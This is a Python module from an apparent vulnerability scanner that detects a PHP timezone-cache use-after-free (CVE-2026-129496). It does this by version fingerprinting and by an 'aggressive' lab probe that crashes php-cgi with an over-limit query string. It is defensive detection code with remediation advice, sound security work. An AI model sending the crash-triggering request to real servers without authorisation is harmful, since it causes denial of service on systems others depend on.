from __future__ import annotations

import re
from typing import Any

from ...core.categories import VulnerabilityType
from ...core.http import HttpSession, is_transport_error, normalize_url, transport_error_detail
from ...core.models import Confidence, Finding, Status
from ...core.transcript import attach_transcript
from ...core.versions import parse_version_required, parse_version_safe

CVE_ID = "CVE-2026-129496"
NAME = "PHP timezone cache use-after-free"
RULE = (
    "PHP <8.2.36, 8.3.* <8.3.37, 8.4.* <8.4.28, 8.5.* <8.5.13 "
    "(requires a file-based startup diagnostic)"
)
TYPE = VulnerabilityType.MEMORY_CORRUPTION
HAS_EXPLOIT = True
EXPLOIT_MODES = ["aggressive"]

FIXED_BY_BRANCH = {
    "8.2": "8.2.36",
    "8.3": "8.3.37",
    "8.4": "8.4.28",
    "8.5": "8.5.13",
}
LEGACY_BRANCHES = {"7.4", "8.0", "8.1"}
CRASH_MARKER = "PHP-CGI-CRASH"
POWERED_BY_RE = re.compile(r"PHP/([0-9]+(?:\.[0-9]+)+)", re.IGNORECASE)


def classify_version(version: str | None) -> str:
    parsed = parse_version_safe(version)
    if parsed is None:
        return Status.DETECTED_VERSION_UNKNOWN
    branch = f"{parsed.major}.{parsed.minor}"
    fixed = FIXED_BY_BRANCH.get(branch)
    if fixed:
        return Status.LIKELY_VULNERABLE if parsed < parse_version_required(fixed) else Status.PATCHED
    if branch in LEGACY_BRANCHES or parsed.major < 8 or (parsed.major == 8 and parsed.minor < 2):
        # The advisory lists every version below 8.2.36, but these branches
        # have no upstream fixed release. A public version string cannot
        # distinguish an old build from a distributor backport.
        return Status.NOT_CONFIRMED
    return Status.NOT_AFFECTED


def _powered_by(response: dict[str, Any]) -> str | None:
    headers = response.get("headers") or {}
    values: list[str] = []
    if isinstance(headers, dict):
        for key, value in headers.items():
            if str(key).lower() == "x-powered-by":
                values.extend(value if isinstance(value, list) else [str(value)])
    for value in values:
        match = POWERED_BY_RE.search(value)
        if match:
            return match.group(1)
    return None


def passive_result(php_runtime: dict[str, Any] | None) -> Finding:
    runtime = php_runtime or {}
    version = runtime.get("version")
    if not runtime.get("detected"):
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status=Status.NOT_DETECTED,
            confidence=Confidence.LOW,
            component="PHP runtime",
            affected_rule=RULE,
            exploit_available=HAS_EXPLOIT,
            detail="PHP was not fingerprinted from public HTTP responses.",
            action=(
                "Upgrade to 8.2.36, 8.3.37, 8.4.28, or 8.5.13; as a workaround fix startup "
                "diagnostics and use a non-file error log (for example syslog), then restart "
                "the PHP master and workers."
            ),
            vulnerability_type=TYPE,
        )

    status = classify_version(version)
    if status == Status.LIKELY_VULNERABLE:
        detail = (
            f"Detected PHP {version}; the version is in the advisory range. The demonstrated "
            "trigger also needs a startup diagnostic written through PHP's file-based "
            "error_log (for example an invalid date.timezone or a session warning) and an "
            "early request diagnostic such as the max_input_vars warning in a fresh worker. "
            "FPM's own error log does not satisfy the condition."
        )
        confidence = Confidence.MEDIUM
    elif status == Status.PATCHED:
        detail = f"Detected PHP {version}, which is at or beyond the branch-specific fixed release."
        confidence = Confidence.HIGH
    elif status == Status.NOT_CONFIRMED:
        detail = (
            f"Detected PHP {version} on an EOL branch without an upstream fixed release. "
            "The effective status depends on the distributor package and any backported patch."
        )
        confidence = Confidence.MEDIUM
    else:
        detail = (
            f"Detected PHP {version}; the advisory's affected ranges do not include this branch."
        )
        confidence = Confidence.HIGH

    return Finding(
        cve=CVE_ID,
        name=NAME,
        status=status,
        confidence=confidence,
        component="PHP runtime",
        component_version=version,
        affected_rule=RULE,
        exploit_available=HAS_EXPLOIT,
        detail=detail,
        action=(
            "Upgrade to 8.2.36, 8.3.37, 8.4.28, or 8.5.13; as a workaround fix startup "
            "diagnostics and use a non-file error log (for example syslog), then restart "
            "the PHP master and workers."
        ),
        evidence={
            "source": runtime.get("source"),
            "server": runtime.get("server"),
            "active_probe": "not_sent",
            "required_conditions": "file-based startup diagnostic + early request diagnostic",
            "package_backport_required": status == Status.NOT_CONFIRMED,
        },
        vulnerability_type=TYPE,
    )


def run_aggressive_probe(target_url: str, timeout: int = 12, proxy: str | None = None) -> Finding:
    """Trigger the timezone-cache UAF crash in the CGI lab.

    The lab runs php-cgi behind a Perl CGI front end. The baseline request
    has no query string; the probe carries two input variables and therefore
    exceeds max_input_vars=1. On affected builds the CGI process segfaults
    and the wrapper returns HTTP 500 with PHP-CGI-CRASH; fixed builds return
    200 with OK. The wrapper stays alive, so the follow-up request proves the
    server recovered.
    """
    base = normalize_url(target_url)
    sess = HttpSession(base, timeout=timeout, proxy=proxy)

    baseline = sess.get("/index.php", timeout=timeout)
    baseline_body = str(baseline.get("body", ""))
    if baseline.get("status") != 200 or "OK" not in baseline_body:
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status=Status.NOT_CONFIRMED,
            confidence=Confidence.MEDIUM,
            component="PHP runtime",
            affected_rule=RULE,
            exploit_available=HAS_EXPLOIT,
            exploit_ran=True,
            detail=(
                "The lab baseline endpoint /index.php did not answer with the expected OK marker. "
                "The CGI crash differential needs the labs/cve-2026-129496 app; no payload was sent."
            ),
            action="Serve the labs/cve-2026-129496 app and retry in an isolated lab.",
            evidence={"baseline_status": baseline.get("status")},
            vulnerability_type=TYPE,
        )

    lab_php = _powered_by(baseline)
    probe = sess.get("/index.php?a=1&b=2", timeout=max(timeout, 30))
    probe_body = str(probe.get("body", ""))
    probe_status = int(probe.get("status", 0) or 0)
    crash = is_transport_error(probe) or (probe_status == 500 and CRASH_MARKER in probe_body)
    fixed = probe_status == 200 and "OK" in probe_body

    followup = sess.get("/index.php", timeout=timeout)
    followup_status = int(followup.get("status", 0) or 0)
    followup_alive = followup_status == 200 and "OK" in str(followup.get("body", ""))

    evidence = attach_transcript(
        {
            "endpoint": "/index.php?a=1&b=2",
            "lab_php": lab_php,
            "baseline_status": baseline.get("status"),
            "probe_status": probe_status,
            "probe_crash_marker": CRASH_MARKER in probe_body,
            "probe_transport_error": is_transport_error(probe),
            "followup_status": followup_status,
            "followup_alive": followup_alive,
        },
        sess,
    )

    if crash and followup_alive:
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status=Status.VULNERABLE,
            confidence=Confidence.CONFIRMED,
            component="PHP runtime",
            affected_rule=RULE,
            exploit_available=HAS_EXPLOIT,
            exploit_ran=True,
            proof_url=f"{base}/index.php?a=1&b=2",
            detail=(
                "The first request with more than max_input_vars input variables crashed the "
                "php-cgi process (HTTP 500 PHP-CGI-CRASH) while the CGI front end stayed alive "
                "and answered the follow-up request. Fixed builds return 200. This confirms "
                "CVE-2026-129496 without executing code."
            ),
            action=(
                "Upgrade to 8.2.36, 8.3.37, 8.4.28, or 8.5.13; as a workaround fix startup "
                "diagnostics and use a non-file error log (for example syslog), then restart "
                "the PHP master and workers."
            ),
            evidence=evidence,
            vulnerability_type=TYPE,
        )

    if crash and not followup_alive:
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status=Status.ERROR,
            confidence=Confidence.LOW,
            component="PHP runtime",
            affected_rule=RULE,
            exploit_available=HAS_EXPLOIT,
            exploit_ran=True,
            proof_url=f"{base}/index.php?a=1&b=2",
            detail=(
                "The probe crashed the CGI process and the follow-up request also failed; "
                f"the lab server may be down ({transport_error_detail(probe)})."
            ),
            action="Restart the lab stack and retry; confirm /index.php answers 200 first.",
            evidence=evidence,
            vulnerability_type=TYPE,
        )

    if fixed:
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status=Status.NOT_CONFIRMED,
            confidence=Confidence.HIGH,
            component="PHP runtime",
            affected_rule=RULE,
            exploit_available=HAS_EXPLOIT,
            exploit_ran=True,
            proof_url=f"{base}/index.php?a=1&b=2",
            detail=(
                "The probe returned HTTP 200 with OK; the CGI process survived the "
                "max_input_vars warning, which is the fixed-build behavior."
            ),
            action="No action required if the runtime is at or beyond the branch-specific fixed release.",
            evidence=evidence,
            vulnerability_type=TYPE,
        )

    return Finding(
        cve=CVE_ID,
        name=NAME,
        status=Status.NOT_CONFIRMED,
        confidence=Confidence.MEDIUM,
        component="PHP runtime",
        affected_rule=RULE,
        exploit_available=HAS_EXPLOIT,
        exploit_ran=True,
        proof_url=f"{base}/index.php?a=1&b=2",
        detail=(
            f"The probe returned HTTP {probe_status} without the expected crash or OK marker; "
            "the lab geometry may differ from the CGI reproducer."
        ),
        action="Confirm the lab runs php-cgi with max_input_vars=1 and a file-based error_log.",
        evidence=evidence,
        vulnerability_type=TYPE,
    )


def check(
    target_url: str,
    cms_version: str | None = None,
    php_runtime: dict[str, Any] | None = None,
    run_exploit_check: bool = False,
    timeout: int = 12,
    proxy: str | None = None,
    exploit_mode: str = "safe",
    aggressive_command: str | None = None,
    aggressive_args: dict[str, Any] | None = None,
    **kwargs: Any,
) -> Finding:
    del cms_version, aggressive_command, aggressive_args, kwargs
    passive = passive_result(php_runtime)
    if not run_exploit_check:
        return passive
    if exploit_mode != "aggressive":
        passive.detail += (
            " This CVE needs the lab-only CGI crash differential (aggressive mode)."
        )
        return passive
    if passive.status not in {Status.LIKELY_VULNERABLE, Status.DETECTED_VERSION_UNKNOWN}:
        passive.detail += " Aggressive proof skipped because the PHP version was not potentially affected."
        return passive
    result = run_aggressive_probe(target_url, timeout=timeout, proxy=proxy)
    result.component_version = passive.component_version
    return result


def metadata() -> dict[str, Any]:
    return {
        "cve": CVE_ID,
        "cms": "php",
        "name": NAME,
        "component": "PHP runtime",
        "affected_rule": RULE,
        "affected_versions": [
            "<8.2.36",
            ">=8.3.0,<8.3.37",
            ">=8.4.0,<8.4.28",
            ">=8.5.0,<8.5.13",
        ],
        "exploit_available": HAS_EXPLOIT,
        "exploit_modes": EXPLOIT_MODES,
        "intrusive": True,
        "vulnerability_type": TYPE,
        "module_version": "1.0.0",
        "last_reviewed": "2026-11-22",
        "updated": "2026-11-22",
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2026-129496",
            "https://github.com/php/php-src/security/advisories/GHSA-gr4f-wgx5-jpfv",
            "https://github.com/php/php-src/commit/cb20015e045508ed6642ab7d72858270f9224d64",
            "https://www.php.net/",
        ],
    }
